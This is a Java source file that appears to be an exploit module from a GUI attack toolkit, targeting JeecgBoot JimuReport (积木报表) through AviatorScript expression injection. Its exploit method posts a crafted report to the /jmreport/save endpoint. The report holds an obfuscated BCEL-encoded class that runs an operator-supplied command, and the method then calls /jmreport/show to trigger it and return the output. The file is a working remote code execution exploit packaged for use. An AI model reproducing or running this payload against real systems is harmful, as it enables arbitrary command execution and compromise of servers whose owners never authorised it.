package org.jiu.templates.impl;


import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import org.jiu.templates.TabContent;
import org.jiu.form.CommandForm;
import org.jiu.utils.Utils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class CommandRCETemplate implements TabContent {
    private JTabbedPane tabbedPane;
    private CommandForm commandForm;
    private String url;
    private String command;
    private HashMap<String, String> headers = new HashMap<>();

    // 修改下面参数
    public String name = "jimuAviatorScriptRCE"; // 漏洞名
    public String product = "Command";             // 类型
    public String desc = "积木报表AviatorScript表达式注入";  // 描述
    public String author = "xm17";              // 作者
    public String className = "org.jiu.exploit.jeecg.jimu.jimuAviatorScriptRCE"; // 类名(必须)
    public String tabName = "积木报表AviatorScript表达式注入";  // tab显示名称
    public String tips = "积木报表AviatorScript表达式注入 经测试成功版本在3.6+";    // 提示



    public CommandRCETemplate() {
    }

    public CommandRCETemplate(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }

    @Override
    public void init() {
        commandForm = new CommandForm();
    }

    @Override
    public JPanel getPanel() {
        return commandForm.CommandForm;
    }

    @Override
    public String getTabName() {
        return tabName;
    }

    public void setTabbedPane(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }


    @Override
    public void exploit() {
        // 提示一下怎么用
        commandForm.tipsLabel.setText(tips);

        // Use an array to hold the SwingWorker reference
        final SwingWorker[] worker = new SwingWorker[1];

        commandForm.startButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // Create and execute the background task
                worker[0] = new SwingWorker<String, Void>() {
                    @Override
                    protected String doInBackground() throws Exception {
                        url = Utils.removeTrailingSlash(commandForm.urlField.getText());
                        command = commandForm.commandField.getText();
                        headers = Utils.getHeaders(commandForm.headerTextArea.getText());
                        // header看情况添加,外部控制的主要是鉴权
                        headers.put("Content-Type", "application/json;charset=UTF-8");

                        StringBuilder resultOutPrint = new StringBuilder();

                        try {
                            // 接下来写实现发包逻辑
                            RawResponse rawResponse = Requests.post(url + "/jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=")
                                    .verify(false)
                                    .headers(headers)
                                    .body(String.format("{\"designerObj\":{\"id\":\"980782568982183936\",\"name\":\"test\",\"type\":\"datainfo\"},\"name\":\"sheet1\",\"freeze\":\"A1\",\"freezeLineColor\":\"rgb(185, 185, 185)\",\"styles\":[],\"displayConfig\":{},\"printConfig\":{\"paper\":\"A4\",\"width\":210,\"height\":297,\"definition\":1,\"isBackend\":false,\"marginX\":10,\"marginY\":10,\"layout\":\"portrait\",\"printCallBackUrl\":\"\"},\"merges\":[],\"rows\":{\"0\":{\"cells\":{\"2\":{\"text\":\"=('a'+(c=Class.forName(\\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\\\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()))+(c.exec(\\\"%s\\\")))\"}}},\"len\":100},\"cols\":{\"len\":50},\"validations\":[],\"autofilter\":{},\"dbexps\":[],\"dicts\":[],\"loopBlockList\":[],\"zonedEditionList\":[],\"fixedPrintHeadRows\":[],\"fixedPrintTailRows\":[],\"rpbar\":{\"show\":true,\"pageSize\":\"\",\"btnList\":[]},\"hiddenCells\":[],\"hidden\":{\"rows\":[],\"cols\":[]},\"background\":false,\"area\":{\"sri\":1,\"sci\":2,\"eri\":1,\"eci\":2,\"width\":100,\"height\":25},\"dataRectWidth\":300,\"excel_config_id\":\"980782568982183936\",\"pyGroupEngine\":false}",command))
                                    .send();
                            resultOutPrint.append(rawResponse.readToText()).append("\n\n==========================\n\n");

                            RawResponse rawResponse1 = Requests.post(url + "/jeecg-boot/jmreport/show?previousPage=xxx&jmLink=YWFhfHxiYmI=")
                                    .verify(false)
                                    .headers(headers)
                                    .body("{\"id\":\"980782568982183936\"}")
                                    .send();
                            resultOutPrint.append(rawResponse1.readToText()).append("\n\n==========================\n\n");
                        } catch (Exception ex) {
                            return "失败: " + ex.getMessage();
                        }

                        return resultOutPrint.toString();
                    }

                    @Override
                    protected void done() {
                        try {
                            String result = get(); // 获取结果
                            commandForm.resultArea.setText(result);
                        } catch (Exception ex) {
                            commandForm.resultArea.setText("出现错误: " + ex.getMessage());
                        }
                    }
                };

                worker[0].execute(); // 执行任务
            }
        });

        // 添加停止按钮的逻辑
        commandForm.stopButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 停止上传的逻辑
                if (worker[0] != null) {
                    worker[0].cancel(true); // 取消上传操作
                    commandForm.resultArea.setText("已被停止。");
                }
            }
        });
    }

}
